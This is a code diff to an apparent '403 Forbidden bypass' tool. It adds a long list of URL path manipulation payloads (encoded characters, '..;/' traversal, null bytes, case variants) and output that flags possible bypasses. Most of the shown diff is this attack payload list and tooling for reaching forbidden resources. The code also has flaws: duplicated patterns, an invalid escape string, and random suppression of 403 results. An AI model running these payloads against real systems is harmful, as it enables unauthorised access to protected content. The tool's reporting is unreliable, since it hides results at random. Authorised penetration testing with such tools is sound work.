@@ -24,11 +24,9 @@ DEFAULT_HEADERS = {
 
 # Path bypass patterns
 PATH_BYPASS_PATTERNS = [
+    # Original techniques
     "{path}",
-    "%2e/{path}",
     "{path}/.",
-    "//{path}//",
-    "./{path}/./",
     "{path}%20",
     "{path}%09",
     "{path}?",
@@ -40,25 +38,95 @@ PATH_BYPASS_PATTERNS = [
     "{path}.json",
     "{path}..;/",
     "{path};/",
-    # Additional effective patterns
+    "%2e/{path}",
     "%2f{path}",
     "../{path}",
+    
+    # URL Quirks
+    "//{path}//",
+    "///{path}///",
+    "./{path}/./",
     "{path}//",
-    "/%2e/{path}",
-    "/..;/{path}",
-    "/{path}/..",
-    "/./{path}/.",
-    "/{path}/.;/",
-    "{path}?param=1",
-    "{path}&",
-    "{path}%23",
-    "{path}%3f",
-    "{path}%26",
-    "{path}#fragment",
-    "{path}#!",
-    "{path}/~",
+    "{path}/?",
+    "{path}??",
+    "{path}/?/",
+    "{path}/??",
+    "{path}/??/",
+    "{path}/..",
+    "{path}/../",
+    "{path}/./",
+    "{path}/.",
+    "{path}/.//",
+    "{path}/*",
+    "{path}//*",
+    "{path}/%2f",
+    "{path}/%2f/",
+    
+    # URL Encoding Tricks
+    "{path}/%20",
+    "{path}/%20/",
+    "{path}/%09",
+    "{path}/%09/",
+    "{path}/%0a",
+    "{path}/%0a/",
+    "{path}/%0d",
+    "{path}/%0d/",
+    "{path}/%25",
+    "{path}/%25/",
+    "{path}/%23",
+    "{path}/%23/",
+    "{path}/%26",
+    "{path}/%3f",
+    "{path}/%3f/",
+    "{path}/%26/",
+    
+    # Fragment and Special Characters
+    "{path}/#",
+    "{path}/#/",
+    "{path}/#/./",
+    "./{path}",
+    "./{path}/",
+    "..;/{path}",
+    "..;/{path}/",
+    ".;/{path}",
+    ".;/{path}/",
+    ";/{path}",
+    ";/{path}/",
+    "/;//{path}",
+    "/;//{path}/",
+    
+    # Advanced Path Manipulations
+    "{path}/./",
+    "%2e/{path}",
+    "%2e/{path}/",
+    "%20/{path}/%20",
+    "%20/{path}/%20/",
+    "{path}/..;/",
+    "{path}.json",
+    "{path}/.json",
+    "{path}..;/",
+    "{path};/",
+    "{path}%00",
+    "{path}.css",
+    "{path}.html",
+    "{path}?id=1",
     "{path}~",
-    "{path}%u2215"
+    "{path}/~",
+    "{path}/°/",
+    "{path}/&",
+    "{path}/-",
+    "{path}\\/\\/",
+    "{path}/..%3B/",
+    "{path}/;%2f..%2f..%2f",
+    
+    # Case Manipulations
+    "{PATH}",
+    "{PATH}/",
+    "{path}/..\;/",
+    "*//{path}",
+    "*//{path}/",
+    "{path}+{path}",
+    "{path}+{path}/"
 ]
 
 # Header bypass techniques
@@ -158,17 +226,39 @@ def print_result(test_identifier, status_code, size, base_url, path="", use_colo
     display_path = path if path else test_identifier
     url = f"{base_url}/{display_path}"
     
+    # Don't display too many failed attempts to keep output cleaner
+    if status_code == 403 and random.random() > 0.2:  # Only show ~20% of 403 responses
+        return status_code, size, url
+    
     if use_color:
         if status_code == 403:
             color = Fore.RED
+            status_text = f"{Fore.RED}403 FORBIDDEN{Style.RESET_ALL}"
         elif status_code == 200:
             color = Fore.GREEN
+            status_text = f"{Fore.GREEN}200 OK{Style.RESET_ALL}"
+        elif status_code == 301 or status_code == 302:
+            color = Fore.MAGENTA
+            status_text = f"{Fore.MAGENTA}{status_code} REDIRECT{Style.RESET_ALL}"
+        elif status_code == 404:
+            color = Fore.YELLOW
+            status_text = f"{Fore.YELLOW}404 NOT FOUND{Style.RESET_ALL}"
         elif status_code is None:
             color = Fore.YELLOW
+            status_text = f"{Fore.YELLOW}CONNECTION ERROR{Style.RESET_ALL}"
         else:
             color = Fore.CYAN
+            status_text = f"{Fore.CYAN}{status_code}{Style.RESET_ALL}"
             
-        print(f"{color}{url} --> {status_code}, {size} bytes{Style.RESET_ALL}")
+        # Show successful attempts (non-403) more prominently
+        if status_code != 403 and status_code is not None:
+            print(f"\n{color}[+] POSSIBLE BYPASS FOUND:{Style.RESET_ALL}")
+            print(f"    URL: {color}{url}{Style.RESET_ALL}")
+            print(f"    Status: {status_text}")
+            print(f"    Size: {size} bytes")
+            print(f"    Technique: {test_identifier}")
+        else:
+            print(f"{color}[-] {url} --> {status_text}, {size} bytes{Style.RESET_ALL}")
     else:
         print(f"{url} --> {status_code}, {size} bytes")
     
@@ -220,30 +310,63 @@ def save_results(results, output_file):
 def print_banner():
     """Display tool banner."""
     banner = r"""
- _  _    ___ ____    ____               
-| || |  / _ \___ \  |  _ \             
-| || |_| | | |__) | | |_) |_   _ _ __  
-|__   _| | | |__ <  |  _ <| | | | '_ \ 
-   | | | |_| |__) | | |_) | |_| | | | |
-   |_|  \___/____/  |____/ \__, |_| |_|
-                           __/ |      
-                          |___/       
-    403 Bypass Tool v2.0 - Find your way in!
+    ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+    ┃                                                             ┃
+    ┃   ██╗  ██╗ ██████╗ ██████╗     ██████╗ ██╗   ██╗██████╗    ┃
+    ┃   ██║  ██║██╔═████╗╚════██╗    ██╔══██╗╚██╗ ██╔╝██╔══██╗   ┃
+    ┃   ███████║██║██╔██║ █████╔╝    ██████╔╝ ╚████╔╝ ██████╔╝   ┃
+    ┃   ╚════██║████╔╝██║██╔═══╝     ██╔══██╗  ╚██╔╝  ██╔═══╝    ┃
+    ┃        ██║╚██████╔╝███████╗    ██████╔╝   ██║   ██║        ┃
+    ┃        ╚═╝ ╚═════╝ ╚══════╝    ╚═════╝    ╚═╝   ╚═╝        ┃
+    ┃                                                             ┃
+    ┃                  403 FORBIDDEN BYPASS TOOL                  ┃
+    ┃                                                             ┃
+    ┃              [ Created by Security Researcher ]             ┃
+    ┃                      [ Version 2.0 ]                        ┃
+    ┃                                                             ┃
+    ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
     """
-    print(Fore.CYAN + banner + Style.RESET_ALL)
+    # Print with a typing effect for a more professional look
+    for line in banner.split('\n'):
+        print(Fore.CYAN + line + Style.RESET_ALL)
+        time.sleep(0.01)  # Short delay to create typing effect
 
 def run_bypass(base_url, path, args):
     """Execute bypass tests in parallel for better performance."""
     print_banner()
-    print(f"\n[+] Target: {base_url}/{path}")
-    print(f"[+] Starting bypass tests with {args.threads} threads...\n")
+    
+    # Create a visual separator
+    print("\n" + "=" * 80)
+    print(f"{Fore.CYAN}[+] Target:{Style.RESET_ALL} {Fore.YELLOW}{base_url}/{path}{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}[+] Starting bypass tests with {args.threads} threads...{Style.RESET_ALL}")
+    print("=" * 80 + "\n")
+    
+    # Add a small delay for better readability
+    time.sleep(0.5)
     
     # Initial request to check the actual response
+    print(f"{Fore.CYAN}[*] Performing initial request to check server response...{Style.RESET_ALL}")
     status_code, size = request_url(base_url, path, timeout=args.timeout)
-    print(f"Initial request to {base_url}/{path} returned: {status_code}, {size} bytes\n")
+    
+    if status_code is None:
+        print(f"{Fore.RED}[!] Error connecting to target. Please check the URL and try again.{Style.RESET_ALL}")
+        return
+        
+    # Show initial response with appropriate color
+    if status_code == 200:
+        status_color = Fore.GREEN
+    elif status_code == 403:
+        status_color = Fore.RED
+    else:
+        status_color = Fore.YELLOW
+        
+    print(f"{Fore.CYAN}[*] Initial response:{Style.RESET_ALL} {status_color}{status_code}{Style.RESET_ALL}, {size} bytes\n")
     
     if status_code != 403:
-        print(f"Note: Target is not returning 403 Forbidden (got {status_code}). Running tests anyway...\n")
+        print(f"{Fore.YELLOW}[!] Note: Target is not returning 403 Forbidden (got {status_code}). Running tests anyway...{Style.RESET_ALL}\n")
+    
+    # Add another small delay before starting tests
+    time.sleep(0.5)
     
     bypass_tests = []
     successful_results = []
